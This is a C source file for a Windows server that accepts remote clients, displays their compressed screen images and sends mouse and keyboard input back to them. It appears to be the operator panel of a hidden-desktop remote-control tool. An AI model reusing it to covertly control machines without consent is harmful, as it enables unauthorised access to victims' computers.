#include "common.h"
#include "controlwindow.h"

typedef struct
{
   SOCKET connections[end];
   DWORD  uhid;
   HWND   hWnd;
   BYTE  *pixels;
   DWORD  pixelsWidth, pixelsHeight;
   DWORD  screenWidth, screenHeight;
   HDC    hDcBmp;
   HANDLE minEvent;
   BOOL   fullScreen;
   RECT   windowedRect;

} CLIENT, *PCLIENT;

COLORREF            gColor = RGB( 255, 174, 201 );
DWORD               gSleepTime = 33;

DWORD               gMinWidth  = 800;
DWORD               gMinHeight = 600;

CLIENT              gClients[MAX_CLIENTS];
CRITICAL_SECTION    gCrit;

__typeof__( RtlDecompressBuffer )* pRtlDecompressBuffer = NULL;

PCLIENT GetClient( BOOL uhid, DWORD uhidData, HWND hWndData )
{
    for( INT i = 0; i < MAX_CLIENTS; ++i )
    {
        if( uhid )
        {
            if(gClients[i].uhid == uhidData )
            {
                return &gClients[i];
            };

        } else
        {
            if( gClients[i].hWnd == hWndData )
            {
                return &gClients[i];
            };
        };
    };

    return NULL;
};

INT SendInt( SOCKET s, INT i )
{
   return send( s, ( PCHAR )&i, sizeof( i ), 0 );
}

BOOL SendInputMsg( SOCKET s, UINT msg, WPARAM wParam, LPARAM lParam )
{
    MSGPACKET input;
    input.msg = msg;
    input.lParam = lParam;
    input.wParam = wParam;   
    if( send(s, ( PCHAR )&input, sizeof( input ), 0) <= 0 )
    {
        return FALSE;
    };

   return TRUE;
};

LRESULT CALLBACK WndProc( HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam )
{
    PCLIENT pClient = GetClient( FALSE, 0, hWnd );

    switch( msg )
    {
        case WM_CREATE:
        {
            HMENU hMenubar = CreateMenu();
            HMENU hQualityMenu = CreateMenu();

            AppendMenuA( hMenubar, MF_POPUP, ( UINT_PTR )hQualityMenu, "Quality" );
            AppendMenuA( hQualityMenu, MF_STRING, QUALITY_LOW, "Low");
            AppendMenuA( hQualityMenu, MF_STRING, QUALITY_MEDIUM, "Medium" );
            AppendMenuA( hQualityMenu, MF_STRING, QUALITY_HIGH, "High" );
            SetMenu( hWnd, hMenubar );

            break;
        };
        case WM_SYSCOMMAND:
        {
            if( wParam == SC_RESTORE )
            {
                SetEvent( pClient->minEvent );

            };

            return DefWindowProc( hWnd, msg, wParam, lParam );
        };
        case WM_COMMAND:
        {
            if( wParam >= QUALITY_LOW && wParam <= QUALITY_HIGH )
            {
                EnterCriticalSection( &gCrit );
                if(!SendInputMsg( pClient->connections[input], WM_SET_QUALITY, wParam, 0 ) )
                {
                    PostQuitMessage( 0 );
                };

                LeaveCriticalSection( &gCrit );
                break;
            };
        };
        case WM_PAINT:
        {
            PAINTSTRUCT ps;
            HDC         hDc = BeginPaint( hWnd, &ps );

            RECT clientRect;
            GetClientRect( hWnd, &clientRect );

            RECT rect;
            HBRUSH hBrush = CreateSolidBrush( RGB( 0, 0, 0 ) );
            rect.left = 0;
            rect.top = 0;
            rect.right = clientRect.right;
            rect.bottom = clientRect.bottom;

            rect.left = pClient->pixelsWidth;
            FillRect( hDc, &rect, hBrush );
            rect.left = 0;
            rect.top = pClient->pixelsHeight;
            FillRect( hDc, &rect, hBrush );
            DeleteObject( hBrush );

            BitBlt( hDc, 0, 0, pClient->pixelsWidth, pClient->pixelsHeight, pClient->hDcBmp, 0, 0, SRCCOPY );
            EndPaint( hWnd, &ps );
            break;
        };
        case WM_DESTROY:
        {
            PostQuitMessage( 0 );
            break;
        };
        case WM_ERASEBKGND:
        {
            return TRUE;
        };
        case WM_LBUTTONDOWN:
        case WM_LBUTTONUP:
        case WM_RBUTTONDOWN:
        case WM_RBUTTONUP:
        case WM_MBUTTONDOWN:
        case WM_MBUTTONUP:
        case WM_LBUTTONDBLCLK:
        case WM_RBUTTONDBLCLK:
        case WM_MBUTTONDBLCLK:
        case WM_MOUSEMOVE:
        case WM_MOUSEWHEEL:
        {
            if( msg == WM_MOUSEMOVE && GetKeyState( VK_LBUTTON ) >= 0 )
            {
                break;
            };

            INT x = GET_X_LPARAM(lParam);
            INT y = GET_Y_LPARAM(lParam);

            FLOAT ratioX = ( FLOAT ) pClient->screenWidth / pClient->pixelsWidth;
            FLOAT ratioY = ( FLOAT ) pClient->screenHeight / pClient->pixelsHeight;

            x = ( INT ) ( x * ratioX );
            y = ( INT ) ( y * ratioY );
            lParam = MAKELPARAM( x, y );
            EnterCriticalSection( &gCrit );
            if(!SendInputMsg( pClient->connections[input], msg, wParam, lParam ) )
            {
                PostQuitMessage(0);
            };

            LeaveCriticalSection( &gCrit );
            break;
        };
        case WM_CHAR:
        {
            if(iscntrl(wParam))
                break;
            EnterCriticalSection(&gCrit);
            if(!SendInputMsg( pClient->connections[input], msg, wParam, 0 ) )
            {
                PostQuitMessage(0);
            };

            LeaveCriticalSection(&gCrit);
            break;
        };
        case WM_KEYDOWN:
        case WM_KEYUP:
        {
            switch( wParam )
            {
                case VK_UP:
                case VK_DOWN:
                case VK_RIGHT:
                case VK_LEFT:
                case VK_HOME:
                case VK_END:
                case VK_PRIOR:
                case VK_NEXT:
                case VK_INSERT:
                case VK_RETURN:
                case VK_DELETE:
                case VK_BACK:
                {
                    break;
                };
                default:
                {
                    return 0;
                };
            };

            EnterCriticalSection( &gCrit );
            if(!SendInputMsg( pClient->connections[input], msg, wParam, 0 ) )
            {
                PostQuitMessage(0);
            };

            LeaveCriticalSection(&gCrit);
            break;
        };
        case WM_GETMINMAXINFO:
        {
            PMINMAXINFO mmi = ( PMINMAXINFO ) lParam;
            mmi->ptMinTrackSize.x = gMinWidth;
            mmi->ptMinTrackSize.y = gMinHeight;
            if ( pClient )
            {
                mmi->ptMaxTrackSize.x = pClient->screenWidth;
                mmi->ptMaxTrackSize.y = pClient->screenHeight;
            };

            break;
        };
        default:
        {
            return DefWindowProc( hWnd, msg, wParam, lParam );
        };
    };

    return 0;
};

DWORD WINAPI ClientThread( PVOID param )
{
   PCLIENT  pClient = NULL;
   SOCKET   s = ( SOCKET )param;
   BYTE     buf[sizeof( MAGIC )];
   INT      connection;
   DWORD    uhid;

   if( recv( s, ( PCHAR )buf, sizeof( MAGIC ), 0) <= 0 )
   {
      closesocket( s );
      return 0;
   };

   if( memcmp( buf, MAGIC, sizeof( MAGIC ) ) )
   {
      closesocket( s );
      return 0;
   };

   if( recv(s, (PCHAR )&connection, sizeof( connection ), 0 ) <= 0 )
   {
      closesocket(s);
      return 0;
   };

    SOCKADDR_IN     addr;
    INT             addrSize;

    addrSize = sizeof( addr ); 
    getpeername( s, ( SOCKADDR* )&addr, &addrSize );
    uhid = addr.sin_addr.S_un.S_addr;

   if(connection == desktop)
   {
        pClient = GetClient( TRUE, uhid, NULL );
        if( !pClient )
        {
            closesocket( s );
            return 0;
        };

        pClient->connections[desktop] = s;

        BITMAPINFO bmpInfo;
        bmpInfo.bmiHeader.biSize = sizeof( bmpInfo.bmiHeader );
        bmpInfo.bmiHeader.biPlanes = 1;
        bmpInfo.bmiHeader.biBitCount = 24;
        bmpInfo.bmiHeader.biCompression = BI_RGB;
        bmpInfo.bmiHeader.biClrUsed = 0;

        for( ;; )
        {
            RECT rect;
            GetClientRect( pClient->hWnd, &rect );

            if( rect.right == 0 )
            {
                ResetEvent( pClient->minEvent );
                WaitForSingleObject( pClient->minEvent, 5000 );
                continue;
            };

            INT realRight = ( rect.right > pClient->screenWidth && pClient->screenWidth > 0 ) ? pClient->screenWidth : rect.right;
            INT realBottom = ( rect.bottom > pClient->screenHeight && pClient->screenHeight > 0 ) ? pClient->screenHeight : rect.bottom;

            if( ( realRight * 3 ) % 4 )
            {
                realRight += ( ( realRight * 3 ) % 4 );
            };
                

            if( SendInt( s, realRight ) <= 0 || SendInt( s, realBottom ) <= 0 )
            {
                goto cleanup;
            };

            DWORD width;
            DWORD height;
            DWORD size;
            BOOL recvPixels;

            if( recv( s, ( PCHAR )&recvPixels, sizeof( recvPixels ), 0 ) <= 0 )
            {
                goto cleanup;
            };

            if( !recvPixels )
            {
                Sleep( gSleepTime );
                continue;
            };

            if( recv(s, ( PCHAR )&pClient->screenWidth, sizeof( pClient->screenWidth ), 0) <= 0 ||
                recv(s, ( PCHAR )&pClient->screenHeight, sizeof( pClient->screenHeight ), 0) <= 0 ||
                recv(s, ( PCHAR )&width, sizeof( width ), 0) <= 0 ||
                recv(s, ( PCHAR )&height, sizeof( height ), 0) <= 0 ||
                recv(s, ( PCHAR )&size, sizeof( size ), 0) <= 0 )
            {
                goto cleanup;
            };

            PBYTE   compressedPixels = ( PBYTE )malloc( size );
            INT     totalRead = 0;

            do
            {
                INT read = recv( s, ( PCHAR )compressedPixels + totalRead, size - totalRead, 0 );
                if( read <= 0 )
                {
                    goto cleanup;
                };

                totalRead += read;

            } while( totalRead != size );

            EnterCriticalSection( &gCrit );
            {
                DWORD newPixelsSize = width * 3 * height;
                PBYTE newPixels = ( PBYTE )malloc( newPixelsSize );

                pRtlDecompressBuffer( COMPRESSION_FORMAT_LZNT1, newPixels, newPixelsSize, compressedPixels, size, &size );
                free( compressedPixels );

                if( pClient->pixels && pClient->pixelsWidth == width && pClient->pixelsHeight == height )
                {
                    for( DWORD i = 0; i < newPixelsSize; i += 3 )
                    {
                        if( newPixels[i]     == GetRValue( gColor ) &&
                            newPixels[i + 1] == GetGValue( gColor ) &&
                            newPixels[i + 2] == GetBValue( gColor ) )
                        {
                            continue;
                        };

                        pClient->pixels[i] = newPixels[i];
                        pClient->pixels[i + 1] = newPixels[i + 1];
                        pClient->pixels[i + 2] = newPixels[i + 2];
                    };

                    free( newPixels );

                } else
                {
                    free( pClient->pixels) ;
                    pClient->pixels = newPixels;
                };

                HDC     hDc = GetDC( 0 );
                HDC     hDcBmp = CreateCompatibleDC( hDc );
                HBITMAP hBmp;

                hBmp = CreateCompatibleBitmap( hDc, width, height );
                SelectObject( hDcBmp, hBmp );

                bmpInfo.bmiHeader.biSizeImage = newPixelsSize;
                bmpInfo.bmiHeader.biWidth = width;
                bmpInfo.bmiHeader.biHeight = height;
                SetDIBits( hDcBmp, hBmp, 0, height, pClient->pixels, &bmpInfo, DIB_RGB_COLORS );

                DeleteDC( pClient->hDcBmp );
                pClient->pixelsWidth = width;
                pClient->pixelsHeight = height;
                pClient->hDcBmp = hDcBmp;

                InvalidateRgn( pClient->hWnd, NULL, TRUE );

                DeleteObject( hBmp );
                ReleaseDC( NULL, hDc );
            };

            LeaveCriticalSection( &gCrit );

            if( SendInt( s, 0 ) <= 0 )
            {
                goto cleanup;
            };
        };

cleanup:
      PostMessage( pClient->hWnd, WM_DESTROY, 0, 0 );
      return 0;

    } else if( connection == input )
    {
        CHAR ip[16];
        EnterCriticalSection( &gCrit );
        {
            pClient = GetClient( TRUE, uhid, NULL );
            if( pClient )
            {
                closesocket( s );
                LeaveCriticalSection( &gCrit );
                return 0;
            };

            IN_ADDR addr;
            addr.S_un.S_addr = uhid;
            strcpy( ip, inet_ntoa( addr ) );
            printf( "[+] New Connection: %s\n", ip );

            BOOL found = FALSE;
            for( INT i = 0; i < MAX_CLIENTS; ++i )
            {
                if( !gClients[i].hWnd )
                {
                found = TRUE;
                pClient = &gClients[i];
                };
            };

            if( !found )
            {
                printf( "[!] Client %s Disconnected: Maximum %d Clients Allowed\n", ip, MAX_CLIENTS );
                closesocket( s );
                return 0;
            };

            pClient->uhid = uhid;
            pClient->connections[input] = s;

            pClient->hWnd = CW_Create( uhid, gMinWidth, gMinHeight );
            pClient->minEvent = CreateEventA( NULL, TRUE, FALSE, NULL );
        };

        LeaveCriticalSection( &gCrit );

        SendInt( s, 0 );

        MSG msg;
        while( GetMessage( &msg, NULL, 0, 0 ) > 0 )
        {
            PeekMessage( &msg, NULL, WM_USER, WM_USER, PM_NOREMOVE );
            TranslateMessage( &msg );
            DispatchMessage( &msg );
        };

        EnterCriticalSection( &gCrit );
        {
            printf( "[!] Client %s Disconnected\n", ip );
            free( pClient->pixels );
            DeleteDC( pClient->hDcBmp);
            closesocket( pClient->connections[input] );
            closesocket( pClient->connections[desktop] );
            CloseHandle( pClient->minEvent );
            memset( pClient, 0, sizeof( CLIENT ) );
        };

        LeaveCriticalSection( &gCrit );
    };
    return 0;
};

BOOL StartServer( INT port )
{
    WSADATA     wsa;
    SOCKET      serverSocket;
    SOCKADDR_IN addr;
    HMODULE     ntdll = LoadLibraryA( "ntdll.dll" );

    pRtlDecompressBuffer = *( __typeof__( RtlDecompressBuffer ) * )GetProcAddress( ntdll, "RtlDecompressBuffer" );
    InitializeCriticalSection( &gCrit );
    memset( gClients, 0, sizeof( gClients ) );
    CW_Register( WndProc );

    if( WSAStartup( MAKEWORD( 2, 2 ), &wsa ) != 0 )
    {
        return FALSE;
    };

    if( ( serverSocket = socket( AF_INET, SOCK_STREAM, 0 ) ) == INVALID_SOCKET )
    {
            return FALSE;
    };

    addr.sin_family      = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port        = htons(port);

    if( bind( serverSocket, ( SOCKADDR* )&addr, sizeof( addr ) ) == SOCKET_ERROR )
    {
        return FALSE;
    };

    if( listen( serverSocket, SOMAXCONN ) == SOCKET_ERROR )
    {
        return FALSE;
    };

    INT addrSize = sizeof( addr );
    getsockname( serverSocket, ( SOCKADDR* )&addr, &addrSize );

    for( ;; )
    {
        SOCKET s;
        SOCKADDR_IN addr;
        s = accept( serverSocket, ( SOCKADDR* )&addr, &addrSize );
        CreateThread( NULL, 0, ClientThread, ( LPVOID )s, 0, 0 );
    };
};
